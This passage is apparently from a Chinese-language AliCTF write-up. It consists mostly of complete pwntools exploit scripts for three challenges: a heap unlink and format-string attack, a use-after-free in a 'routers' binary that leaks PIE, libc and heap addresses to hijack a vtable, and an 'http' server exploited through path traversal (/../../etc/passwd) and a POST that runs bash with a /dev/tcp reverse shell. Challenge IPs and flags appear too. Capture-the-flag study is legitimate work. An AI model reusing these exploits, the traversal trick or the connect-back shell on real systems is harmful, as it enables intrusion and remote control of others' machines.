        addmsg(256)
        addmsg(248)
        addmsg(240)
        addmsg(256)
        addmsg(256)
        addmsg(256)
        setmsg(7, '%17$p')
        payload = ''
        payload += p64(0) + p64(0xf1)
        payload += p64(ptr-0x18) + p64(ptr-0x10)
        payload = payload.ljust(240, 'x00')
        payload += p64(0xf0)
        setmsg(0,payload)
        delmsg(1)
        payload2 = p64(0) + p32(0) + p32(16) + p64(0) + p64(freegot) + p64(2000) + p64(0x6020e0) + p32(0x1000)
        setmsg(0, payload2)
        setmsg(0, p64(printf)[:-1])
        delmsg(7)
        buf = ru('Done').rstrip('Done').lstrip('0x')
        libc_start_main_ret = int(buf, 16)
    #info('Libc leaked = ' + hex(libc_start_main_ret))
        libc = libc_start_main_ret - 0x21f45
        system = libc + 0x0000000000046590
        setmsg(6, '/bin/sh;')
        setmsg(0, p64(system)[:-1])
        delmsg(6)
        io.interactive()
    return
    if __name__ == '__main__':
        io = remote('114.55.103.213',9733)
        pwn()
        io.close()
    routers
    connect(0,1), connect(1,2)会导致router 0中指针单向指向router 1, 此时delete(1)会导致uaf.
    脚本:
    #!/usr/bin/env python2
    # -*- coding:utf-8 -*-    from pwn import *
    import os
    # flag : alictf{S0rry_F0r_USiNG_CP1uSp1Us_vTaB1es}
    # switches
    DEBUG = 0
    # libc = 2.19 ubuntu-6.9
    os.environ["LD_PRELOAD"] = "./libc-x.so"
    # modify this
    if DEBUG:
        io = process('./routers')
    else:
        io = remote('114.55.103.213',6565)
    if DEBUG: context(log_level='debug')
    # define symbols and offsets here
    # simplified r/s function
    def ru(delim):
    return io.recvuntil(delim)
    def rn(count):
    return io.recvn(count)
    def sl(data):
    return io.sendline(data)
    def sn(data):
    return io.send(data)
    def info(string):
    return log.info(string)
    # define interactive functions here
    def create_route(t,name):
        ru('>')
        sl('create router')
        ru(':')
        sl(t)
        ru('name: ')
        sl(name)
    return
    def create_terminal(t,name,attached):
        ru('>')
        sl('create terminal')
        ru(':')
        sl(attached)
        ru(':')
        sl(t)
        ru(':')
        sl(name)
    return
    def delete_router(name):
        ru('>')
        sl('delete router')
        ru(':')
        sl(name)
    return
    def connect(name1, name2):
        ru('>')
        sl('connect')
        ru(':')
        sl(name1)
        ru(':')
        sl(name2)
    return
    def disconnect(name):
        ru('>')
        sl('disconnect')
        ru(':')
        sl(name)
    return
    def show():
        ru('>')
        sl('show')
    return
    # define exploit function here
    def pwn():
    if DEBUG: gdb.attach(io)
    # uaf in disconnect
        create_route('cisco', '123')
        create_route('cisco', 'aaa')
        create_route('cisco', 'bbb')
        connect('123', 'aaa')
        connect('aaa', 'bbb')
        delete_router('aaa')
        create_terminal('osx','hello','bbb')
        show()
        ru('to ')
        pie = u64(ru('n')[:-1].ljust(8,'x00')) - 0x204b30
        info('PIE Leaked = ' + hex(pie))
        got = pie + 0x204EC8
        create_route('cisco', 'b1')
        create_route('cisco', 'b2')
        create_route('cisco', 'b3')
        create_route('cisco', 'b4')
        connect('b1','b2')
        connect('b2','b3')
        delete_router('b2')
        delete_router('b4')
        payload = 'A'*0x8 + p64(got) + p64(0) + p64(0)[:-1]
        create_route('cisco', payload)
        show()
        ru('to ')
        ru('to ')
    #offset_setvbuf = 0x70670
        offset_setvbuf = 0x705a0
        libc = u64(ru('n')[:-1].ljust(8,'x00')) - offset_setvbuf
        info('Libc Leaked = ' + hex(libc))
    # leak heap address
        delete_router(payload)
        xxx_vtable = libc + 0x3BE060 - 8
        payload2 = p64(xxx_vtable) + p64(pie) + p64(0) + p64(0)[:-1]
        create_route('cisco', payload2)
        create_route('cisco', 'feeder')
        delete_router('feeder')
        disconnect('b1')
        show()
    for i in xrange(6): ru('named ')
        heap_addr = u64(ru(' ')[:-1].ljust(8,'x00')) - 0x340
        info('Heap addr leaked = ' + hex(heap_addr))
    # final stage
        create_route('cisco', 'c1')
        create_route('cisco', 'c2')
        create_route('cisco', 'c3')
        create_route('cisco', 'c4')
        connect('c1', 'c2')
        connect('c2', 'c3')
        delete_router('c2')
        delete_router('c4')
        gadget = libc + 0xE4968
        payload3 = p64(heap_addr+0x450) + p64(pie) + p64(0) + p64(0)[:-1]
        create_route('cisco', payload3)
        spray = 7 * p64(gadget)
        create_route('cisco', spray)
    '''
        poprdi = libc + 0x0000000000022b9a
        system = libc + 0x46590
        binsh = libc + 0x17C8C3
        ropchain = ''
        ropchain += p64(poprdi)
        ropchain += p64(binsh)
        ropchain += p64(system)
        '''
        disconnect('c1')
        io.interactive()
    return
    if __name__ == '__main__':
        pwn()
**http**
题目是一个http服务器,刚开始没有给binary,经过测试发现,修改http头的请求目录可以导致任意文件读取(e.g.: GET
/../../../../../etc/passwd HTTP/1.1),
通过此漏洞读取/proc/self/maps获取binary路径,然后得到二进制文件,分析后发现服务器处理post请求处有漏洞,利用见脚本:
    #!/usr/bin/env python2
    # -*- coding:utf-8 -*-    from pwn import *
    import os
    # flag : alictf{1et's_p14y_with_thr34ds_at_httpd}
    # switches
    DEBUG = 0
    # modify this
    if DEBUG:
        io = remote('127.0.0.1', 46962)
    else:
        io = remote('120.26.90.0',42665)
    if DEBUG: context(log_level='debug')
    # define symbols and offsets here
    # simplified r/s function
    def ru(delim):
    return io.recvuntil(delim)
    def rn(count):
    return io.recvn(count)
    def sl(data):
    return io.sendline(data)
    def sn(data):
    return io.send(data)
    def info(string):
    return log.info(string)
    # define interactive functions here
    def sendpost(target, content):
        buf = ''
        buf += 'POST '
        buf += target
        buf += ' HTTP/1.1n'
        buf += 'Content-Length: '
        buf += str(len(content))
        buf += 'nn'
        buf += content
        sn(buf)
    return
    # define exploit function here
    def pwn():
    if DEBUG: gdb.attach(io)
    # arbitary file read vuln in httpd
    # dumping the binary and we find post content is passed to a newly created process, which we can specify
    #sendpost('/../../../../../../bin/bash', 'ls -la /;exitn')
        sendpost('/../../../../../../bin/bash', 'bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/xxxx 0>&1;exit;n')# connect back shell
        io.interactive()